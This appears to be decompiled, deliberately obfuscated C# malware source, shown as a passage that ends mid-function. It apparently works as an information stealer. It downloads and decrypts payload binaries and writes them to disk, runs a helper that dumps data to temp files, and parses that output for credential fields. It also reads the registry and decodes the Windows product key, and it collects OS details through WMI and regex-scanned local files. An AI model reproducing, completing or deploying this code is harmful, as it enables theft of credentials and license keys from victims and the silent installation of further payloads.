using System;
using System.Collections;
using System.IO;
using System.Management;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;

[StandardModule]
internal sealed class _____________________________________________________________________
{
	private static string _;

	public static string __;

	[DllImport("advapi32.dll", SetLastError = true)]
	internal static extern int RegQueryValueEx(UIntPtr uintptr_0, string string_0, int int_0, ref int int_1, byte[] byte_0, ref int int_2);

	[DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
	public static extern int RegOpenKeyEx(UIntPtr uintptr_0, [MarshalAs(UnmanagedType.VBByRefStr)] ref string string_0, int int_0, int int_1, ref int int_2);

	public unsafe static string ___(string string_0)
	{
		try
		{
			_ = ______________________.____ + ______________________________________________________________._______________________ + _003CModule_003E.____<string>(1457469466u);
			______(string_0);
			return _______() + ___________() + ____________();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = _003CModule_003E.__________(sizeof(byte) + 61476, (int)((nint)Type.EmptyTypes.LongLength + 63235), (int)((nint)Type.EmptyTypes.LongLength + 64));
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public unsafe static string ____(string string_0)
	{
		string text = ______________________.____ + ______________________________________________________________._______________________ + _003CModule_003E.____<string>(3892028685u);
		int num3 = default(int);
		int num4 = default(int);
		int num15 = default(int);
		try
		{
			_____(string_0, text);
			string result = default(string);
			try
			{
				int num2 = default(int);
				int num;
				if (!File.Exists(text))
				{
					result = _003CModule_003E.__________(sizeof(float) + 2975, (int)((nint)Type.EmptyTypes.LongLength + 2920), sizeof(ulong) + 135);
					num = -1233;
					if ((((uint)num2 / 8388608u) ^ 0x1E74) == 0)
					{
						goto IL_0447;
					}
					return result;
				}
				Random random = new Random();
				string tempPath = Path.GetTempPath();
				num3 = random.Next(1000, 9000);
				string text2 = tempPath + num3;
				num = (int)((nint)Type.EmptyTypes.LongLength + -22497);
				goto IL_068c;
				IL_0161:
				num4 = _003CModule_003E._____________;
				if (((uint)(53108736 * num4) ^ 0xAA2u) != 0)
				{
					goto IL_01e1;
				}
				int num5 = sizeof(ushort) + -2027711872;
				nint num6 = num5;
				goto IL_0187;
				IL_03de:
				num = -29031;
				string text3 = default(string);
				string text4 = default(string);
				if (text3.Contains(_003CModule_003E._____<string>(1740951417u)))
				{
					text4 = _____________(text3);
					if (num == 5926)
					{
					}
				}
				if (!text3.Contains(_003CModule_003E._____<string>(578154245u)))
				{
					goto IL_041d;
				}
				string text5 = _____________(text3);
				nint num7 = (nint)Type.EmptyTypes.LongLength + 6;
				goto IL_064f;
				IL_068c:
				string text6 = default(string);
				if (______________(text2, text))
				{
					Thread.Sleep(3500);
					if (!File.Exists(text2))
					{
						if (num == -19769)
						{
							int ________________ = _003CModule_003E._________________;
							if (4436480 + 512 * (________________ - -(0x9C9 & ________________)) != ________________ * 65536)
							{
								goto IL_01e1;
							}
						}
						Thread.Sleep(10000);
					}
					if (File.Exists(text2))
					{
						text6 = File.ReadAllText(text2);
						int num8 = default(int);
						int num9;
						if ((1 & (num8 + 1899)) == (int)(((uint)(94388224 * num8 - 9439) >> 14) & 1))
						{
							num9 = 1;
							num7 = num9;
						}
						else
						{
							num9 = sizeof(int) + -1792340070;
							num7 = num9;
						}
						goto IL_064f;
					}
				}
				goto IL_06cd;
				IL_025a:
				int num10 = default(int);
				string[] array = default(string[]);
				string text7 = default(string);
				int num12 = default(int);
				if (num10 < array.Length)
				{
					text7 = array[num10];
					int num11 = _003CModule_003E.____________;
					if (694478600 + -798085120 * num2 == 454261308)
					{
						goto IL_068c;
					}
					if (28104 + num * 7 + 9 * num != (int)((uint)num % 176u >> 27))
					{
						num7 = sizeof(ushort) + 10;
					}
					else
					{
						num12 = _003CModule_003E._____________;
						if (((3 * num12 + num12) & 8) != ((4 * (num12 - -9604)) & 8))
						{
							if (((num11 * -1140850688 + -8825) | -1504) == -89)
							{
								goto IL_068c;
							}
							num7 = sizeof(byte) + -2101691860;
						}
						else
						{
							int num13 = _003CModule_003E.__________;
							if (781 * num13 + 2682 + 243 * num13 == 8829)
							{
								num7 = (nint)Type.EmptyTypes.LongLength + -2008352752;
							}
							else
							{
								int num14 = default(int);
								if (((((uint)num14 / 65536u + 2984) ^ ((uint)num14 % 13650589u * 8)) & 0x80000000u) != 0)
								{
									goto IL_068c;
								}
								num7 = sizeof(ulong) + -1554143491;
							}
						}
					}
					goto IL_064f;
				}
				try
				{
					File.Delete(text2);
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				string text8 = text8 + _003CModule_003E._______<string>(1109215133u);
				result = text8;
				return result;
				IL_0423:
				string[] array2 = default(string[]);
				string text9 = default(string);
				if (num15 < array2.Length)
				{
					text3 = array2[num15];
					num = 15013;
					uint num16 = (uint)num10 / 259788388u >> 17;
					int ________________2 = _003CModule_003E._________________;
					if (((num16 ^ (uint)(________________2 << 8)) & 0x10) == 0)
					{
						if (!text3.Contains(_003CModule_003E._______<string>(3174539959u)))
						{
							goto IL_03de;
						}
						text9 = _____________(text3);
						num = (int)((nint)Type.EmptyTypes.LongLength + -29031);
						num7 = sizeof(double) + -3;
						goto IL_064f;
					}
				}
				else
				{
					num = 23768;
					if ((nint)Type.EmptyTypes.LongLength + 14629 != 14629)
					{
						goto IL_0447;
					}
					if (!((Operators.CompareString(text9, _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 55459), (int)((num3 * 3 + num3 * 5 - -4294 != 7523) ? 54252 : ((nint)Type.EmptyTypes.LongLength + 1511394071)), (int)((nint)Type.EmptyTypes.LongLength + 178)), false) != 0) & (Operators.CompareString(text4, _003CModule_003E.__________(((num10 << 7) * 5 + (num10 << 7) * 11 != -1672069985) ? 21643 : (-1540686376), (int)((~((uint)(num15 * 1100) % 65536u) == (uint)(1677721600 * num15 << 2)) ? (-723195527) : ((nint)Type.EmptyTypes.LongLength + 24567)), (int)((nint)Type.EmptyTypes.LongLength + 251)), false) != 0)))
					{
						goto IL_0254;
					}
					num = 21833;
					if (sizeof(ushort) + 23766 == 22718)
					{
						goto IL_0533;
					}
				}
				string[] array3 = new string[7] { text8, null, null, null, null, null, null };
				num7 = sizeof(uint) + 4;
				goto IL_064f;
				IL_0447:
				string[] array4 = default(string[]);
				array2 = array4;
				num15 = 0;
				goto IL_0423;
				IL_01e1:
				num6 = (nint)Type.EmptyTypes.LongLength + 55486;
				goto IL_0187;
				IL_041d:
				num15++;
				goto IL_0423;
				IL_06cd:
				result = _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 32749), 35840, (int)(((0xBED ^ ((num10 * 25190400 - (num15 << 7)) * num10)) == 0) ? ((nint)Type.EmptyTypes.LongLength + -1864316095) : 233));
				return result;
				IL_0533:
				array3[1] = text9;
				array3[2] = _003CModule_003E.______<string>(1514956238u);
				num7 = sizeof(long) + -4;
				goto IL_064f;
				IL_0254:
				num10++;
				goto IL_025a;
				IL_064f:
				string[] array5 = default(string[]);
				string text10 = default(string);
				while (true)
				{
					switch (num7)
					{
					case 13:
						break;
					case 0:
						goto IL_01b4;
					case 3:
						goto IL_01e1;
					case 12:
						goto IL_021e;
					case 11:
						goto IL_0370;
					case 10:
						array = array5;
						num10 = 0;
						goto IL_025a;
					case 5:
						goto IL_03de;
					case 6:
						goto IL_041d;
					case 9:
						goto IL_0447;
					case 8:
						goto IL_0533;
					case 4:
						goto IL_05a9;
					case 2:
						text8 = _003CModule_003E._____<string>(934375637u);
						array5 = Strings.Split(text6, text10, -1, (CompareMethod)0);
						goto case 10;
					case 1:
						goto IL_062d;
					default:
						goto IL_068c;
					}
					break;
					IL_062d:
					text10 = _003CModule_003E._____<string>(688887851u);
					if (text6.Contains(text10))
					{
						num7 = (nint)Type.EmptyTypes.LongLength + 2;
						continue;
					}
					goto IL_06cd;
					IL_021e:
					if (text7.Contains(_003CModule_003E._______<string>(2059718724u)))
					{
						array4 = Strings.Split(text7, _003CModule_003E.___<string>(902284615u), -1, (CompareMethod)0);
						num7 = sizeof(short) + -2;
						continue;
					}
					goto IL_0254;
					IL_05a9:
					array3[3] = text4;
					array3[4] = _003CModule_003E.____<string>(4093950867u);
					num7 = ((((4273098752u * ((uint)num12 % 114u)) ^ 0x4131B94Bu) != 0) ? ((~((uint)num3 % 64u) == (uint)(num3 * 28 + 4 * num3 << 6 << 23)) ? (sizeof(int) + -1776496240) : ((nint)Type.EmptyTypes.LongLength + 11)) : (sizeof(uint) + -2102345528));
					continue;
					IL_0370:
					array3[5] = text5;
					array3[6] = _003CModule_003E.____<string>(3763093088u);
					text8 = string.Concat(array3);
					goto IL_0254;
				}
				goto IL_0161;
				IL_01b4:
				text9 = _003CModule_003E.__________(sizeof(double) + 34155, sizeof(ulong) + 37123, (int)((nint)Type.EmptyTypes.LongLength + 199));
				goto IL_0161;
				IL_0187:
				text4 = _003CModule_003E.__________(num5, 54363, 181);
				num = -23855;
				if (sizeof(short) + 20422 == -6670)
				{
					goto IL_01b4;
				}
				text5 = _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 46348), 49330, sizeof(long) + 65);
				num7 = (nint)Type.EmptyTypes.LongLength + 9;
				goto IL_064f;
			}
			catch (Exception ex)
			{
				ProjectData.SetProjectError(ex);
				Exception ex2 = ex;
				______________________________________________________________.______________(_003CModule_003E.____<string>(1187660804u), _003CModule_003E._____<string>(2547527197u) + ex2.ToString());
				ProjectData.ClearProjectError();
				return result;
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			string result = _003CModule_003E.__________((int)(((2 & ((uint)num15 / 15397u >> 18)) != (uint)(((num15 + num15) * (0x8A2 & num15)) & 2)) ? ((nint)Type.EmptyTypes.LongLength + -1010296382) : ((nint)Type.EmptyTypes.LongLength + 61981)), (int)((3592 + num4 * 553648128 == -1798467862) ? ((nint)Type.EmptyTypes.LongLength + 1616380673) : (((uint)num3 / 316779108u == 1996039184) ? ((nint)Type.EmptyTypes.LongLength + 2059302158) : ((((288 * num4 + -4211 + num4 * 224) & 0xC90) == 0) ? (-205612073) : ((nint)Type.EmptyTypes.LongLength + 65043)))), 48);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public unsafe static void _____(string string_0, string string_1)
	{
		try
		{
			byte[] byte_ = default(byte[]);
			if (12756 == (nint)Type.EmptyTypes.LongLength + 12756)
			{
				if (File.Exists(string_1))
				{
					return;
				}
				nint num;
				if (Operators.CompareString(string_0, string.Empty, false) == 0)
				{
					num = (nint)Type.EmptyTypes.LongLength + 0;
				}
				else
				{
					WebClient webClient = new WebClient();
					byte_ = webClient.DownloadData(string_0);
					int num2 = default(int);
					num = ((~((uint)num2 >> 18) != (uint)num2 / 262144u) ? (sizeof(long) + -7) : ((nint)Type.EmptyTypes.LongLength + 834279977));
				}
				switch (num)
				{
				default:
					return;
				case 1:
					break;
				}
			}
			byte[] byte_2 = ___________________________________________________________________._______(byte_, _003CModule_003E._____<string>(3503602776u));
			byte[] array = ________________________________________________________________________________.______(byte_2);
			if (array.Length == 99328)
			{
				File.WriteAllBytes(string_1, ___________________________________________________________________._______(array, _003CModule_003E.__________(51533, (int)((nint)Type.EmptyTypes.LongLength + 50346), sizeof(byte) + 77)));
			}
			else
			{
				______________________________________________________________.______________(_003CModule_003E.______<string>(3474929201u), _003CModule_003E.____<string>(1623218002u));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.______<string>(3474929201u), _003CModule_003E._______<string>(2771761848u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static void ______(string string_0)
	{
		try
		{
			if (-4043 != (nint)Type.EmptyTypes.LongLength + -4044)
			{
			}
			if (File.Exists(_) || Operators.CompareString(string_0, string.Empty, false) == 0)
			{
				return;
			}
			WebClient webClient = new WebClient();
			byte[] byte_ = webClient.DownloadData(string_0);
			switch (sizeof(ushort))
			{
			}
			byte[] byte_2 = ___________________________________________________________________._______(byte_, _003CModule_003E.______<string>(869619641u));
			byte[] array = ________________________________________________________________________________.______(byte_2);
			if (array.Length == 348160)
			{
				File.WriteAllBytes(_, ___________________________________________________________________._______(array, _003CModule_003E.__________(sizeof(short) + 30537, (int)((nint)Type.EmptyTypes.LongLength + 29323), 16)));
			}
			else
			{
				______________________________________________________________.______________(_003CModule_003E.___<string>(1387161447u), _003CModule_003E.____<string>(3634157491u));
			}
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			______________________________________________________________.______________(_003CModule_003E.______<string>(3474929201u), _003CModule_003E.____<string>(2723589793u) + ex2.ToString());
			ProjectData.ClearProjectError();
		}
	}

	public unsafe static string _______()
	{
		int num3 = default(int);
		try
		{
			string text = _003CModule_003E.____<string>(1190759839u);
			string text2 = Conversions.ToString(_________());
			string text3 = Conversions.ToString(________());
			int num = (int)((nint)Type.EmptyTypes.LongLength + 21307);
			nint num2 = (nint)Type.EmptyTypes.LongLength + 2;
			string[] array = default(string[]);
			int int_;
			while (true)
			{
				switch (num2)
				{
				default:
					while ((Operators.CompareString(text2, string.Empty, false) == 0) | (Operators.CompareString(text3, string.Empty, false) == 0))
					{
						if (num != 21307)
						{
							continue;
						}
						goto IL_0069;
					}
					array = new string[5] { text, null, null, null, null };
					num2 = 1;
					continue;
				case 0:
					int_ = 1107680784;
					break;
				case 1:
					{
						array[1] = text2;
						array[2] = _003CModule_003E._____<string>(2815274875u);
						array[3] = text3;
						array[4] = _003CModule_003E.____<string>(1190759839u);
						return string.Concat(array);
					}
					IL_0069:
					num3 = _003CModule_003E.____________;
					if (~(-(num3 | -39950)) == num3)
					{
						num2 = (nint)Type.EmptyTypes.LongLength + 0;
						continue;
					}
					int_ = 59060;
					break;
				}
				break;
			}
			string result = _003CModule_003E.__________(int_, (int)((nint)Type.EmptyTypes.LongLength + 58173), sizeof(Guid) + 85);
			num = -10043;
			int num4 = _003CModule_003E._______________;
			int num5 = default(int);
			if ((((((8388608 * num4) ^ -9999) | -2225) != -1) ? (((0x100u & (((uint)num5 % 4096u >> 19) ^ (uint)(2048 * num5))) != 0) ? ((nint)Type.EmptyTypes.LongLength + 1214423411) : ((nint)Type.EmptyTypes.LongLength + 1795704181)) : ((((uint)num4 % 32768u << 26) + 31488 != (uint)num4 % 1757u >> 3) ? (sizeof(ulong) + -23113) : (-1896254368))) == -23105)
			{
				return result;
			}
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			nint num7;
			if (~(num3 << 9) != (0x11DB ^ num3) * 512)
			{
				int num6 = _003CModule_003E._______________;
				num7 = ((((uint)(1527 * num6 + num6 * 521) ^ 0x3BB39B1Du) != 0) ? ((nint)Type.EmptyTypes.LongLength + 13740) : (-1887325221));
			}
			else
			{
				num7 = sizeof(byte) + -920848524;
			}
			string result = _003CModule_003E.__________((int)num7, 16442, 38);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object ________()
	{
		try
		{
			UIntPtr uintptr_ = (UIntPtr)2147483650u;
			string string_ = _003CModule_003E._______<string>(2423756285u);
			UIntPtr uIntPtr = default(UIntPtr);
			int int_ = (int)(uint)uIntPtr;
			int num = RegOpenKeyEx(uintptr_, ref string_, 0, 257, ref int_);
			uIntPtr = (UIntPtr)(ulong)int_;
			if (num == 0)
			{
				byte[] byte_ = new byte[2048];
				int int_2 = 2048;
				UIntPtr uintptr_2 = uIntPtr;
				string string_2 = _003CModule_003E._____<string>(3878279769u);
				uint num2 = default(uint);
				int_ = (int)num2;
				int num3 = RegQueryValueEx(uintptr_2, string_2, 0, ref int_, byte_, ref int_2);
				num2 = (uint)int_;
				if (num3 == 0)
				{
					return __________(byte_);
				}
			}
			return string.Empty;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object empty = string.Empty;
			ProjectData.ClearProjectError();
			return empty;
		}
	}

	public static object _________()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003a: Expected O, but got Unknown
		//IL_009c: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a2: Expected O, but got Unknown
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00bf: Expected O, but got Unknown
		//IL_0131: Unknown result type (might be due to invalid IL or missing references)
		//IL_0138: Expected O, but got Unknown
		try
		{
			string text = null;
			try
			{
				ManagementObjectSearcher val = new ManagementObjectSearcher(_003CModule_003E.____<string>(795934529u), _003CModule_003E.______<string>(3427649257u));
				ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
				try
				{
					enumerator = val.Get().GetEnumerator();
					while (enumerator.MoveNext())
					{
						ManagementObject val2 = (ManagementObject)enumerator.get_Current();
						text = Conversions.ToString(Operators.ConcatenateObject((object)text, ((ManagementBaseObject)val2).get_Item(_003CModule_003E.___<string>(1176231577u))));
					}
				}
				finally
				{
					((IDisposable)enumerator)?.Dispose();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				text = _003CModule_003E.______<string>(496562882u);
				ProjectData.ClearProjectError();
			}
			try
			{
				ManagementObjectSearcher val3 = new ManagementObjectSearcher(_003CModule_003E.___<string>(1698050400u), _003CModule_003E.____<string>(3808744460u));
				ManagementObjectEnumerator enumerator2 = default(ManagementObjectEnumerator);
				try
				{
					enumerator2 = val3.Get().GetEnumerator();
					while (enumerator2.MoveNext())
					{
						ManagementObject val4 = (ManagementObject)enumerator2.get_Current();
						text = Conversions.ToString(Operators.ConcatenateObject((object)text, Operators.ConcatenateObject((object)_003CModule_003E.______<string>(851744222u), ((ManagementBaseObject)val4).get_Item(_003CModule_003E._____<string>(2750538808u)))));
					}
				}
				finally
				{
					((IDisposable)enumerator2)?.Dispose();
				}
			}
			catch (Exception projectError2)
			{
				ProjectData.SetProjectError(projectError2);
				text = _003CModule_003E.______<string>(496562882u);
				ProjectData.ClearProjectError();
			}
			try
			{
				if (Operators.CompareString(text, _003CModule_003E.______<string>(496562882u), false) == 0)
				{
					Computer val5 = new Computer();
					text = ((ServerComputer)val5).get_Info().get_OSFullName();
				}
			}
			catch (Exception projectError3)
			{
				ProjectData.SetProjectError(projectError3);
				text = _003CModule_003E.______<string>(496562882u);
				ProjectData.ClearProjectError();
			}
			return text;
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			object result = _003CModule_003E.___<string>(793063634u);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public unsafe static string __________(byte[] byte_0)
	{
		int num6 = default(int);
		int num5 = default(int);
		int num7 = default(int);
		try
		{
			char[] array = new char[24];
			array[0] = 'B';
			int num = sizeof(Guid) + -5;
			nint num2 = num;
			int num9 = default(int);
			int num3 = default(int);
			char[] array2 = default(char[]);
			char[] array3 = default(char[]);
			ArrayList arrayList = default(ArrayList);
			int num10 = default(int);
			int num4 = default(int);
			while (true)
			{
				switch (num2)
				{
				default:
					array[1] = 'C';
					array[2] = 'D';
					num = sizeof(ushort) + 2;
					num2 = num;
					break;
				case 10:
					array[15] = 'X';
					array[16] = 'Y';
					if ((((uint)((num9 | 0x84C) * 32) >> 3) & 2) != (uint)(2 & (num9 * 29352)) || num4 != 10753)
					{
						goto IL_007e;
					}
					array[17] = '2';
					array[18] = '3';
					num2 = sizeof(uint) + -1;
					break;
				case 9:
					array[13] = 'V';
					array[14] = 'W';
					num4 = sizeof(Guid) + 10737;
					goto case 10;
				case 8:
					array[21] = '7';
					array[22] = '8';
					num4 = sizeof(int) + -31789;
					num2 = (((num3 & (53 * num3 + num3 * 75)) - 2250 != -6565) ? (sizeof(uint) + 2) : ((nint)Type.EmptyTypes.LongLength + 1954027345));
					break;
				case 7:
				{
					num6 = num5 % 24;
					array2[num7] = array3[num6];
					num4 = (int)((nint)Type.EmptyTypes.LongLength + -3382);
					int num11 = _003CModule_003E.____________;
					num2 = (((((num11 - 2056) ^ num11) & 4) == 0) ? (sizeof(float) + -3) : (((uint)(num9 * 329 + 1719 * num9) / 82u == 1493426870) ? ((nint)Type.EmptyTypes.LongLength + -1632021974) : (sizeof(float) + 1797495160)));
					break;
				}
				case 6:
					array[23] = '9';
					array3 = array;
					array2 = new char[29];
					if (num4 != -8696)
					{
						arrayList = new ArrayList();
						num10 = 52;
						goto IL_025a;
					}
					goto case 2;
				case 2:
					num7 = 28;
					goto IL_006e;
				case 5:
				{
					array[5] = 'H';
					array[6] = 'J';
					int num8 = num4;
					num4 = -10858;
					if (((0xA17 ^ ((uint)num9 / 408487831u)) & 0xFFFFF850u) == 2064 && num8 == -15848)
					{
						goto IL_0251;
					}
					array[7] = 'K';
					array[8] = 'M';
					if (num4 == -10858)
					{
						array[9] = 'P';
						array[10] = 'Q';
						num2 = (nint)Type.EmptyTypes.LongLength + 0;
						break;
					}
					goto case 4;
				}
				case 4:
					array[3] = 'F';
					array[4] = 'G';
					num4 = sizeof(byte) + 12962;
					num2 = (nint)Type.EmptyTypes.LongLength + 5;
					break;
				case 3:
					array[19] = '4';
					array[20] = '6';
					num2 = (((((uint)(num5 * 1037 + num5 * 1011) / 1927u) ^ 0xFFFFF2CEu) != 0) ? 8 : (sizeof(float) + 1789452119));
					break;
				case 1:
					num3 += -1;
					if (num3 >= 0)
					{
						goto IL_00cd;
					}
					if (num4 == -3382)
					{
						goto IL_007e;
					}
					goto case 7;
				case 0:
					{
						array[11] = 'R';
						array[12] = 'T';
						num2 = sizeof(uint) + 5;
						break;
					}
					IL_00cd:
					num4 = -4153;
					num5 = (num6 << 8) | Conversions.ToByte(arrayList[num3]);
					arrayList[num3] = (byte)(num5 / 24);
					if (-1744830464 + -num6 * 134217728 == num6 << 27)
					{
						goto default;
					}
					num2 = (nint)Type.EmptyTypes.LongLength + 7;
					break;
					IL_007e:
					num7 += -1;
					if (num7 < 0)
					{
						return new string(array2);
					}
					goto IL_006e;
					IL_006e:
					if ((num7 + 1) % 6 == 0)
					{
						array2[num7] = '-';
						goto IL_007e;
					}
					num6 = 0;
					num3 = 14;
					num4 = -4153;
					if ((((0x1260 ^ (num5 * 931 + num5 * 1117)) == 0) ? ((nint)Type.EmptyTypes.LongLength + -861602533) : (-16345)) == -16345)
					{
					}
					goto IL_00cd;
					IL_025a:
					arrayList.Add(byte_0[num10]);
					num4 = 1271;
					goto IL_0251;
					IL_0251:
					num10++;
					if (num10 <= 67)
					{
						goto IL_025a;
					}
					goto case 2;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			int num12;
			nint num13;
			if (((((uint)num6 / 26u) & (uint)num6) ^ 0x1000007Cu) != 0)
			{
				num12 = 57179;
				num13 = num12;
			}
			else
			{
				int num9 = _003CModule_003E.___________;
				if (num9 * 64 != -1308)
				{
					num13 = ((((num7 * 2) & int.MinValue) == (((num7 + num7) ^ 0x1523) & int.MinValue)) ? ((nint)Type.EmptyTypes.LongLength + 1356596617) : ((nint)Type.EmptyTypes.LongLength + -1161914773));
				}
				else
				{
					num12 = -849308599;
					num13 = num12;
				}
			}
			string result = _003CModule_003E.__________((int)num13, (int)((~((uint)num5 / 304u / 1073741824u) != (uint)(524288 * num5 * 58400768)) ? ((nint)Type.EmptyTypes.LongLength + 59852) : (sizeof(float) + -2028307654)), (int)((nint)Type.EmptyTypes.LongLength + 47));
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public unsafe static string ___________()
	{
		try
		{
			string result = default(string);
			IEnumerator enumerator = default(IEnumerator);
			GroupCollection groups = default(GroupCollection);
			Match match = default(Match);
			string[] array = default(string[]);
			string text = default(string);
			while (true)
			{
				string path = Interaction.Environ(_003CModule_003E._______<string>(3720245936u)) + _003CModule_003E._______<string>(2481867110u);
				switch ((nint)Type.EmptyTypes.LongLength + 0)
				{
				case 1:
					return result;
				}
				while (true)
				{
					int num;
					int num2;
					if (File.Exists(path))
					{
						StreamReader streamReader = new StreamReader(path);
						string input = streamReader.ReadToEnd();
						num = 17017;
						if ((nint)Type.EmptyTypes.LongLength + 23894 != 27375)
						{
							Regex regex;
							do
							{
								streamReader.Close();
								new StringBuilder();
								regex = new Regex(_003CModule_003E._____<string>(2394317416u));
								num2 = num;
								num = -29614;
							}
							while (num2 != 17017);
							MatchCollection matchCollection = regex.Matches(input);
							enumerator = matchCollection.GetEnumerator();
							if (num == -30823)
							{
								goto IL_0122;
							}
							goto IL_0155;
						}
						goto IL_0171;
					}
					return _003CModule_003E.__________(sizeof(double) + 49626, 52934, (int)((nint)Type.EmptyTypes.LongLength + 212));
					IL_00ea:
					groups = match.Groups;
					array = new string[6]
					{
						groups[1].Value,
						null,
						null,
						null,
						null,
						null
					};
					num2 = num;
					num = -5146;
					if (num2 == -7403)
					{
						break;
					}
					goto IL_0122;
					IL_0160:
					if (enumerator.MoveNext())
					{
						match = (Match)enumerator.Current;
						num = -2783;
						if ((nint)Type.EmptyTypes.LongLength + -11132 != -11132)
						{
							continue;
						}
						goto IL_00ea;
					}
					return text + _003CModule_003E._______<string>(2865274946u);
					IL_0122:
					array[1] = _003CModule_003E.___<string>(3242391558u);
					array[2] = groups[2].Value;
					num2 = num;
					num = 31201;
					if (num2 != -5146)
					{
						goto IL_0155;
					}
					goto IL_0171;
					IL_0155:
					text = _003CModule_003E._____<string>(2300184420u);
					goto IL_0160;
					IL_0171:
					array[3] = _003CModule_003E._______<string>(1023697363u);
					array[4] = groups[3].Value;
					if (num == 31201)
					{
						array[5] = _003CModule_003E.______<string>(1514956238u);
						string text2 = string.Concat(array);
						text = text + text2 + _003CModule_003E.______<string>(3443430785u);
						goto IL_0160;
					}
					goto IL_00ea;
				}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = _003CModule_003E.__________(sizeof(byte) + 63788, (int)((nint)Type.EmptyTypes.LongLength + 62312), (int)((nint)Type.EmptyTypes.LongLength + 7));
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public unsafe static string ____________()
	{
		string result = default(string);
		try
		{
			if (142 == (nint)Type.EmptyTypes.LongLength + 141)
			{
				goto IL_00c1;
			}
			int num = default(int);
			nint num2;
			int num3 = default(int);
			string text = default(string);
			int num4 = default(int);
			if (!File.Exists(_))
			{
				result = _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 2273), (int)((nint)Type.EmptyTypes.LongLength + 919), (int)(((1 & -num) == (-(-5567 & num) & 1)) ? ((nint)Type.EmptyTypes.LongLength + 160) : (sizeof(ushort) + -765001082)));
				num2 = (nint)Type.EmptyTypes.LongLength + 6;
			}
			else
			{
				Random random = new Random();
				string tempPath = Path.GetTempPath();
				num3 = random.Next(1000, 9000);
				text = tempPath + num3;
				num4 = sizeof(float) + -30565;
				num2 = (nint)Type.EmptyTypes.LongLength + 0;
			}
			goto IL_0638;
			IL_0213:
			string[] array = default(string[]);
			string text2 = default(string);
			string text3 = default(string);
			string text4 = default(string);
			string[] array2 = default(string[]);
			string text5 = default(string);
			if (num >= array.Length)
			{
				num4 = -15865;
				int num5 = _003CModule_003E.___________;
				if ((((((uint)num5 / 632u) & 0x3A000000) == (0x3A000000 & ((uint)num5 / 214225u >> 2))) ? (sizeof(Guid) + -6516) : ((nint)Type.EmptyTypes.LongLength + 2059923956)) == -13040)
				{
					goto IL_0365;
				}
				if ((Operators.CompareString(text2, _003CModule_003E.__________(4915, sizeof(float) + 7605, sizeof(uint) + -4), false) != 0) & (Operators.CompareString(text3, _003CModule_003E.__________((int)((nint)Type.EmptyTypes.LongLength + 51236), sizeof(short) + 49593, 21), false) != 0) & (Operators.CompareString(text4, _003CModule_003E.__________((int)((((num3 * 31 + num3 * 33 - num3 * 536870912) & 0x1E) == 0) ? ((nint)Type.EmptyTypes.LongLength + 49616) : ((nint)Type.EmptyTypes.LongLength + -1003924050)), sizeof(short) + 53066, 178), false) != 0))
				{
					num4 = 21883;
					if (((254 * num + num * 258 - 9193) ^ 0x3647C49F) == 0)
					{
						goto IL_020d;
					}
					array2 = new string[7] { text5, null, null, null, null, null, null };
					goto IL_03c6;
				}
				goto IL_0562;
			}
			string text6 = array[num];
			num4 = (int)((nint)Type.EmptyTypes.LongLength + -14822);
			num2 = sizeof(short) + -1;
			goto IL_0638;
			IL_0562:
			int num6 = num6 + 1;
			goto IL_036b;
			IL_054c:
			string text7 = default(string);
			string[] array3 = default(string[]);
			if (text7.Contains(_003CModule_003E.___<string>(2708903349u)))
			{
				array3 = Strings.Split(text7, _003CModule_003E._______<string>(1043067638u), -1, (CompareMethod)0);
				num4 = sizeof(byte) + -32326;
				goto IL_00c1;
			}
			goto IL_0562;
			IL_03c6:
			array2[1] = text2;
			array2[2] = _003CModule_003E.______<string>(1514956238u);
			num2 = sizeof(ulong) + -5;
			goto IL_0638;
			IL_0441:
			int num7 = default(int);
			if (______________(text, _))
			{
				Thread.Sleep(3500);
				if (File.Exists(text))
				{
					goto IL_03a4;
				}
				if ((0x24E4 & ~(num7 * -663879680)) != 9444 || num4 != -30574)
				{
					goto IL_039a;
				}
				goto IL_03c6;
			}
			goto IL_0672;
			IL_03a4:
			string text8 = default(string);
			if (File.Exists(text))
			{
				text8 = File.ReadAllText(text);
				num2 = (nint)Type.EmptyTypes.LongLength + 5;
				goto IL_0638;
			}
			goto IL_0672;
			IL_00c1:
			text2 = _003CModule_003E.__________(60048, (int)((nint)Type.EmptyTypes.LongLength + 59075), sizeof(long) + 58);
			int ________________ = _003CModule_003E._________________;
			if ((-2600 | (16777216 * ________________)) == -2600 && num4 == 5437)
			{
				goto IL_0138;
			}
